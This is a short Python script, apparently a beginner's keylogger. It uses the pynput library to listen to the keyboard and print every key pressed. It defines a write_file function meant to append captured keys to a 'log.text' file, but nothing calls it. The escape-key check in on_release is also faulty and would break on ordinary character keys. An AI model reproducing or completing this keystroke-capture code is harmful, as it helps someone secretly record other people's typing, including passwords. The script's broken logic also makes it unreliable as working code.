import pynput
from pynput.keyboard import Key,Listener
count =0;
keys={}
def on_press(key): 
    global keys ,count 
    print("{0} pressed".format(key) )

def write_file(keys ):
    with open("log.text","a") as f:
        for key in keys  :
            f.write(key)
            
def on_release(key):
    if key==key.esc:            
        return False 
    
with Listener(on_press=on_press ,on_release= on_release) as listener:
    listener.join()    